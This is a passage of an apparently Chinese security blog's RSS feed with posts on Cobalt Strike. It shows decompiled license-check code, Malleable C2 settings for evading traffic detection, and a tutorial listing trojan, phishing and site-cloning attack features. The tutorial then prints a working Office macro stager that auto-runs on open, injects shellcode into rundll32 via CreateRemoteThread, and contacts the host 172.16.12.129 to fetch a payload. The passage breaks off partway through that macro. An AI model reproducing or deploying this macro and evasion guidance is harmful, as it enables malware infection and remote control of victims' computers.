style=&#34;display:flex;&#34;&gt;&lt;span&gt;      &lt;span style=&#34;color:#66d9ef&#34;&gt;try&lt;/span&gt; {&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;         &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (var2.&lt;span style=&#34;color:#a6e22e&#34;&gt;length&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; 0) {&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; var2;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;         } &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt; {&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            DataParser var3 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;new&lt;/span&gt; DataParser(var2);&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            var3.&lt;span style=&#34;color:#a6e22e&#34;&gt;big&lt;/span&gt;();&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; var4 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; var3.&lt;span style=&#34;color:#a6e22e&#34;&gt;readInt&lt;/span&gt;();&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (var4 &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;889274181) {&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;               &lt;span style=&#34;color:#66d9ef&#34;&gt;this&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;B&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;pre-4.0 authorization file. Run update to get new file&amp;#34;&lt;/span&gt;;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;               &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;new&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;byte&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;0&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            } &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (var4 &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;889274157) {&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;               &lt;span style=&#34;color:#66d9ef&#34;&gt;this&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;B&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;bad header&amp;#34;&lt;/span&gt;;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;               &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;new&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;byte&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;0&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            } &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt; {&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;               &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; var5 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; var3.&lt;span style=&#34;color:#a6e22e&#34;&gt;readShort&lt;/span&gt;();&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;               &lt;span style=&#34;color:#66d9ef&#34;&gt;byte&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[]&lt;/span&gt; var6 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; var3.&lt;span style=&#34;color:#a6e22e&#34;&gt;readBytes&lt;/span&gt;(var5);&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;               &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; var6;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            }&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;         }&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;      } &lt;span style=&#34;color:#66d9ef&#34;&gt;catch&lt;/span&gt; (Exception var7) {&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;         &lt;span style=&#34;color:#66d9ef&#34;&gt;this&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;B&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; var7.&lt;span style=&#34;color:#a6e22e&#34;&gt;getMessage&lt;/span&gt;();&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;         &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;new&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;byte&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;0&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;      }&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;   }&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;   &lt;span style=&#34;color:#66d9ef&#34;&gt;private&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;byte&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[]&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;A&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;byte&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[]&lt;/span&gt; var1) {&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;      &lt;span style=&#34;color:#66d9ef&#34;&gt;byte&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[]&lt;/span&gt; var2 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;new&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;byte&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;0&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;      &lt;span style=&#34;color:#66d9ef&#34;&gt;try&lt;/span&gt; {&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;         &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (&lt;span style=&#34;color:#66d9ef&#34;&gt;this&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;C&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;null&lt;/span&gt;) {&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;new&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;byte&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;0&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;         } &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt; {&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#66d9ef&#34;&gt;synchronized&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;this&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;A&lt;/span&gt;) {&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;               &lt;span style=&#34;color:#66d9ef&#34;&gt;this&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;A&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;init&lt;/span&gt;(2, &lt;span style=&#34;color:#66d9ef&#34;&gt;this&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;C&lt;/span&gt;);&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;               var2 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;this&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;A&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;doFinal&lt;/span&gt;(var1);&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            }&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; var2;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;         }&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;      } &lt;span style=&#34;color:#66d9ef&#34;&gt;catch&lt;/span&gt; (Exception var6) {&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;         &lt;span style=&#34;color:#66d9ef&#34;&gt;this&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;B&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; var6.&lt;span style=&#34;color:#a6e22e&#34;&gt;getMessage&lt;/span&gt;();&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;         &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;new&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;byte&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;0&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;      }&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;   }&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;authkey.pub在反编译出的resources目录下，可以通过ASN1editor去看看公钥&lt;/p&gt;</description>
    </item>
    <item>
      <title>MalleableC2详解</title>
      <link>https://yaphetszz.github.io/posts/malleablec2%E8%AF%A6%E8%A7%A3/</link>
      <pubDate>Mon, 13 Apr 2020 15:18:36 +0800</pubDate>
      <guid>https://yaphetszz.github.io/posts/malleablec2%E8%AF%A6%E8%A7%A3/</guid>
      <description>&lt;h2 id=&#34;malleable-c2和malleable-pe&#34;&gt;malleable C2和Malleable PE&lt;/h2&gt;&#xA;&lt;p&gt;malleable C2 用于规避流量检测&lt;/p&gt;&#xA;&lt;p&gt;官网链接：https://www.cobaltstrike.com/help-malleable-c2&lt;/p&gt;&#xA;&lt;p&gt;需要考虑网络环境，根据目标网络编写Malleable C2 Profile&lt;/p&gt;&#xA;&lt;p&gt;C2的配置可包含以下部分&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;Profile元素&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;global OPTIONS&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;https-certificate&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;code-signer&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;http-get&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;http-post&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;http-stager&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;post-ex&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;TCP Beacon&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&amp;hellip;&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;在 Malleable C2 中, 语句可分为数据转换语句, 终止语句和额外语句三种类型。&lt;/p&gt;&#xA;&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;数据转换语句：base64 base64url mask netbios netbiosu prepend append&#xD;&#xA;终止语句： print uri-append header parameter&#xD;&#xA;额外语句： header parameter&#xA;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;数据转换语句如下：&lt;/p&gt;&#xA;&lt;table&gt;&#xA;  &lt;thead&gt;&#xA;      &lt;tr&gt;&#xA;          &lt;th&gt;声明方式&lt;/th&gt;&#xA;          &lt;th&gt;编码方式&lt;/th&gt;&#xA;      &lt;/tr&gt;&#xA;  &lt;/thead&gt;&#xA;  &lt;tbody&gt;&#xA;      &lt;tr&gt;&#xA;          &lt;td&gt;append &amp;ldquo;string&amp;rdquo;&lt;/td&gt;&#xA;          &lt;td&gt;将指定字符串附加在末尾&lt;/td&gt;&#xA;      &lt;/tr&gt;&#xA;      &lt;tr&gt;&#xA;          &lt;td&gt;base64&lt;/td&gt;&#xA;          &lt;td&gt;Base64编码&lt;/td&gt;&#xA;      &lt;/tr&gt;&#xA;      &lt;tr&gt;&#xA;          &lt;td&gt;base64url&lt;/td&gt;&#xA;          &lt;td&gt;一种变异的Base64编码(这种编码后的数据不会含义破坏url完整性的字符如+号)&lt;/td&gt;&#xA;      &lt;/tr&gt;&#xA;      &lt;tr&gt;&#xA;          &lt;td&gt;mask&lt;/td&gt;&#xA;          &lt;td&gt;XOR编码 key是随机的&lt;/td&gt;&#xA;      &lt;/tr&gt;&#xA;      &lt;tr&gt;&#xA;          &lt;td&gt;netbios&lt;/td&gt;&#xA;          &lt;td&gt;NetBIOS Encode &amp;lsquo;a&amp;rsquo;&lt;/td&gt;&#xA;      &lt;/tr&gt;&#xA;      &lt;tr&gt;&#xA;          &lt;td&gt;netbiosu&lt;/td&gt;&#xA;          &lt;td&gt;NetBIOS Encode &amp;lsquo;A&amp;rsquo;&lt;/td&gt;&#xA;      &lt;/tr&gt;&#xA;      &lt;tr&gt;&#xA;          &lt;td&gt;&lt;/td&gt;&#xA;          &lt;td&gt;上面这种编码方式我也不怎么了解反正我只知道也是一种编码方式，有兴趣的自己谷歌一下吧&lt;/td&gt;&#xA;      &lt;/tr&gt;&#xA;      &lt;tr&gt;&#xA;          &lt;td&gt;prepend &amp;ldquo;string&amp;rdquo;&lt;/td&gt;&#xA;          &lt;td&gt;将指定字符串附加在头部&lt;/td&gt;&#xA;      &lt;/tr&gt;&#xA;  &lt;/tbody&gt;&#xA;&lt;/table&gt;&#xA;&lt;p&gt;Strings转义字符如下：&lt;/p&gt;</description>
    </item>
    <item>
      <title>CS基础和WEB Drive-by功能详解</title>
      <link>https://yaphetszz.github.io/posts/cs%E5%9F%BA%E7%A1%80%E5%92%8Cwebdrive-by%E5%8A%9F%E8%83%BD%E8%AF%A6%E8%A7%A3/</link>
      <pubDate>Mon, 02 Apr 2018 02:13:01 +0800</pubDate>
      <guid>https://yaphetszz.github.io/posts/cs%E5%9F%BA%E7%A1%80%E5%92%8Cwebdrive-by%E5%8A%9F%E8%83%BD%E8%AF%A6%E8%A7%A3/</guid>
      <description>&lt;h2 id=&#34;cs基础&#34;&gt;CS基础&lt;/h2&gt;&#xA;&lt;p&gt;CS服务端启动方式&lt;/p&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;./teamserver ip password&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Attacks-Packages:&lt;/p&gt;&#xA;&lt;p&gt;HTML Application生成恶意HTA木马&lt;/p&gt;&#xA;&lt;p&gt;MS Office Macro生成office宏病毒&lt;/p&gt;&#xA;&lt;p&gt;Payload Generator生成各种语言版本的payload&lt;/p&gt;&#xA;&lt;p&gt;USB/CD Autoplay 生成利用自动播放运行的木马&lt;/p&gt;&#xA;&lt;p&gt;Windows Dropper捆绑器，对文档类进行捆绑&lt;/p&gt;&#xA;&lt;p&gt;Windows Executable 生成可执行exe木马&lt;/p&gt;&#xA;&lt;p&gt;Windows Executable(S)生成无状态的exe木马&lt;/p&gt;&#xA;&lt;p&gt;Attacks-Web Drive-by&lt;/p&gt;&#xA;&lt;p&gt;Manage对开启的web服务进行管理&lt;/p&gt;&#xA;&lt;p&gt;Clone Site克隆网站，可记录受害者提交数据&lt;/p&gt;&#xA;&lt;p&gt;Host File 提供文件下载，可修改Mime信息&lt;/p&gt;&#xA;&lt;p&gt;Powershell Web Delivery类似MSF的WEB_delivery&lt;/p&gt;&#xA;&lt;p&gt;signed applet attack 使用java自签名程序进行钓鱼&lt;/p&gt;&#xA;&lt;p&gt;Smart Applet Attack自动检测Java版本并进行攻击，针对Java1.6.0_45以下以及1.7.0_21以下版本&lt;/p&gt;&#xA;&lt;p&gt;System Profiler用来获取系统信息，如系统版本，Flash版本，浏览器版本等&lt;/p&gt;&#xA;&lt;p&gt;生成对应木马目标执行后就会上线&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../index_files/2fdf5b6a-65b6-4888-9e9b-70f624fefead.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;可以浏览文件，收集内网信息等，但是相比于MSF反应略慢，所以有时候需要MSF和CS联动&lt;/p&gt;&#xA;&lt;h2 id=&#34;cs使用office宏进行攻击&#34;&gt;CS使用office宏进行攻击&lt;/h2&gt;&#xA;&lt;p&gt;新建一个office监听器&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../index_files/63c98e4d-e674-4a25-a25e-2876033e8076.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;点击生成宏后选择监听器&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../index_files/3f82cbe3-a538-43c0-ac0a-8c0b74806e3a.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;宏代码会自动加载，需要自己点击复制然后创建宏&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../index_files/f89def44-eefc-43c7-9dac-f3b8ffaba382.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;默认生成的宏代码如下，该代码并没有做免杀，基本都会直接被杀掉&lt;/p&gt;&#xA;&lt;pre tabindex=&#34;0&#34;&gt;&lt;code class=&#34;language-vbscript&#34; data-lang=&#34;vbscript&#34;&gt;Private Type PROCESS_INFORMATION&#xD;&#xA;    hProcess As Long&#xD;&#xA;    hThread As Long&#xD;&#xA;    dwProcessId As Long&#xD;&#xA;    dwThreadId As Long&#xD;&#xA;End Type&#xD;&#xA;Private Type STARTUPINFO&#xD;&#xA;    cb As Long&#xD;&#xA;    lpReserved As String&#xD;&#xA;    lpDesktop As String&#xD;&#xA;    lpTitle As String&#xD;&#xA;    dwX As Long&#xD;&#xA;    dwY As Long&#xD;&#xA;    dwXSize As Long&#xD;&#xA;    dwYSize As Long&#xD;&#xA;    dwXCountChars As Long&#xD;&#xA;    dwYCountChars As Long&#xD;&#xA;    dwFillAttribute As Long&#xD;&#xA;    dwFlags As Long&#xD;&#xA;    wShowWindow As Integer&#xD;&#xA;    cbReserved2 As Integer&#xD;&#xA;    lpReserved2 As Long&#xD;&#xA;    hStdInput As Long&#xD;&#xA;    hStdOutput As Long&#xD;&#xA;    hStdError As Long&#xD;&#xA;End Type&#xD;&#xA;#If VBA7 Then&#xD;&#xA;    Private Declare PtrSafe Function CreateStuff Lib &amp;#34;kernel32&amp;#34; Alias &amp;#34;CreateRemoteThread&amp;#34; (ByVal hProcess As Long, ByVal lpThreadAttributes As Long, ByVal dwStackSize As Long, ByVal lpStartAddress As LongPtr, lpParameter As Long, ByVal dwCreationFlags As Long, lpThreadID As Long) As LongPtr&#xD;&#xA;    Private Declare PtrSafe Function AllocStuff Lib &amp;#34;kernel32&amp;#34; Alias &amp;#34;VirtualAllocEx&amp;#34; (ByVal hProcess As Long, ByVal lpAddr As Long, ByVal lSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr&#xD;&#xA;    Private Declare PtrSafe Function WriteStuff Lib &amp;#34;kernel32&amp;#34; Alias &amp;#34;WriteProcessMemory&amp;#34; (ByVal hProcess As Long, ByVal lDest As LongPtr, ByRef Source As Any, ByVal Length As Long, ByVal LengthWrote As LongPtr) As LongPtr&#xD;&#xA;    Private Declare PtrSafe Function RunStuff Lib &amp;#34;kernel32&amp;#34; Alias &amp;#34;CreateProcessA&amp;#34; (ByVal lpApplicationName As String, ByVal lpCommandLine As String, lpProcessAttributes As Any, lpThreadAttributes As Any, ByVal bInheritHandles As Long, ByVal dwCreationFlags As Long, lpEnvironment As Any, ByVal lpCurrentDirectory As String, lpStartupInfo As STARTUPINFO, lpProcessInformation As PROCESS_INFORMATION) As Long&#xD;&#xA;#Else&#xD;&#xA;    Private Declare Function CreateStuff Lib &amp;#34;kernel32&amp;#34; Alias &amp;#34;CreateRemoteThread&amp;#34; (ByVal hProcess As Long, ByVal lpThreadAttributes As Long, ByVal dwStackSize As Long, ByVal lpStartAddress As Long, lpParameter As Long, ByVal dwCreationFlags As Long, lpThreadID As Long) As Long&#xD;&#xA;    Private Declare Function AllocStuff Lib &amp;#34;kernel32&amp;#34; Alias &amp;#34;VirtualAllocEx&amp;#34; (ByVal hProcess As Long, ByVal lpAddr As Long, ByVal lSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As Long&#xD;&#xA;    Private Declare Function WriteStuff Lib &amp;#34;kernel32&amp;#34; Alias &amp;#34;WriteProcessMemory&amp;#34; (ByVal hProcess As Long, ByVal lDest As Long, ByRef Source As Any, ByVal Length As Long, ByVal LengthWrote As Long) As Long&#xD;&#xA;    Private Declare Function RunStuff Lib &amp;#34;kernel32&amp;#34; Alias &amp;#34;CreateProcessA&amp;#34; (ByVal lpApplicationName As String, ByVal lpCommandLine As String, lpProcessAttributes As Any, lpThreadAttributes As Any, ByVal bInheritHandles As Long, ByVal dwCreationFlags As Long, lpEnvironment As Any, ByVal lpCurrentDriectory As String, lpStartupInfo As STARTUPINFO, lpProcessInformation As PROCESS_INFORMATION) As Long&#xD;&#xA;#End If&#xD;&#xA;Sub Auto_Open()&#xD;&#xA;    Dim myByte As Long, myArray As Variant, offset As Long&#xD;&#xA;    Dim pInfo As PROCESS_INFORMATION&#xD;&#xA;    Dim sInfo As STARTUPINFO&#xD;&#xA;    Dim sNull As String&#xD;&#xA;    Dim sProc As String&#xD;&#xA;#If VBA7 Then&#xD;&#xA;    Dim rwxpage As LongPtr, res As LongPtr&#xD;&#xA;#Else&#xD;&#xA;    Dim rwxpage As Long, res As Long&#xD;&#xA;#End If&#xD;&#xA;    myArray = Array(-4,-24,-119,0,0,0,96,-119,-27,49,-46,100,-117,82,48,-117,82,12,-117,82,20,-117,114,40,15,-73,74,38,49,-1,49,-64,-84, _&#xD;&#xA;60,97,124,2,44,32,-63,-49,13,1,-57,-30,-16,82,87,-117,82,16,-117,66,60,1,-48,-117,64,120,-123,-64,116,74,1,-48, _&#xD;&#xA;80,-117,72,24,-117,88,32,1,-45,-29,60,73,-117,52,-117,1,-42,49,-1,49,-64,-84,-63,-49,13,1,-57,56,-32,117,-12,3, _&#xD;&#xA;125,-8,59,125,36,117,-30,88,-117,88,36,1,-45,102,-117,12,75,-117,88,28,1,-45,-117,4,-117,1,-48,-119,68,36,36,91, _&#xD;&#xA;91,97,89,90,81,-1,-32,88,95,90,-117,18,-21,-122,93,104,110,101,116,0,104,119,105,110,105,84,104,76,119,38,7,-1, _&#xD;&#xA;-43,-24,-128,0,0,0,77,111,122,105,108,108,97,47,53,46,48,32,40,99,111,109,112,97,116,105,98,108,101,59,32,77, _&#xD;&#xA;83,73,69,32,57,46,48,59,32,87,105,110,100,111,119,115,32,78,84,32,54,46,49,59,32,84,114,105,100,101,110,116, _&#xD;&#xA;47,53,46,48,59,32,76,66,66,82,79,87,83,69,82,41,0,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88, _&#xD;&#xA;88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88,88, _&#xD;&#xA;88,88,88,88,88,0,89,49,-1,87,87,87,87,81,104,58,86,121,-89,-1,-43,-21,121,91,49,-55,81,81,106,3,81,81, _&#xD;&#xA;104,-72,34,0,0,83,80,104,87,-119,-97,-58,-1,-43,-21,98,89,49,-46,82,104,0,2,96,-124,82,82,82,81,82,80,104, _&#xD;&#xA;-21,85,46,59,-1,-43,-119,-58,49,-1,87,87,87,87,86,104,45,6,24,123,-1,-43,-123,-64,116,68,49,-1,-123,-10,116,4, _&#xD;&#xA;-119,-7,-21,9,104,-86,-59,-30,93,-1,-43,-119,-63,104,69,33,94,49,-1,-43,49,-1,87,106,7,81,86,80,104,-73,87,-32, _&#xD;&#xA;11,-1,-43,-65,0,47,0,0,57,-57,116,-68,49,-1,-21,21,-21,73,-24,-103,-1,-1,-1,47,53,100,120,75,0,0,104,-16, _&#xD;&#xA;-75,-94,86,-1,-43,106,64,104,0,16,0,0,104,0,0,64,0,87,104,88,-92,83,-27,-1,-43,-109,83,83,-119,-25,87,104, _&#xD;&#xA;0,32,0,0,83,86,104,18,-106,-119,-30,-1,-43,-123,-64,116,-51,-117,7,1,-61,-123,-64,117,-27,88,-61,-24,55,-1,-1,-1, _&#xD;&#xA;49,55,50,46,49,54,46,49,50,46,49,50,57,0)&#xD;&#xA;    If Len(Environ(&amp;#34;ProgramW6432&amp;#34;)) &amp;gt; 0 Then&#xD;&#xA;        sProc = Environ(&amp;#34;windir&amp;#34;) &amp;amp; &amp;#34;\\SysWOW64\\rundll32.exe&amp;#34;&#xD;&#xA;    Else&#xD;&#xA;        